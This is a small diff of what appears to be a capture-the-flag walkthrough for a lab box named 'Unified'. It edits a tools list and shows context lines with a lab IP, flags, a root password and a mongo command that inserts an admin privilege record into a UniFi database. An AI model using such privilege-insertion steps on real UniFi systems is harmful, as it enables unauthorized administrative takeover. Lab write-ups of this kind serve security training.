@@ -359,7 +359,7 @@ FLAG: dd6e058e814260bc70e9bbdef2715849
 
 ## UNIFIED BOX
 
-**TOOLS USED**: nmap
+**TOOLS USED**: nmap, Burp Suite, netcat, Wireshark
 
 **IP Address**: 10.129.65.88
 
@@ -477,7 +477,7 @@ mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "62e8427c3fd88
 mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "62e8427c3fd88e3ed01f3176", "permissions" : [ ], "role" : "admin", "site_id" : "61ce269d46e0fb0012d47ec5" });'
 ```
 
-USER: root
+USER: root<br>
 PASSWORD: NotACrackablePassword4U2022
 
 FLAG: e50bc93c75b634e4b272d2f771c33681
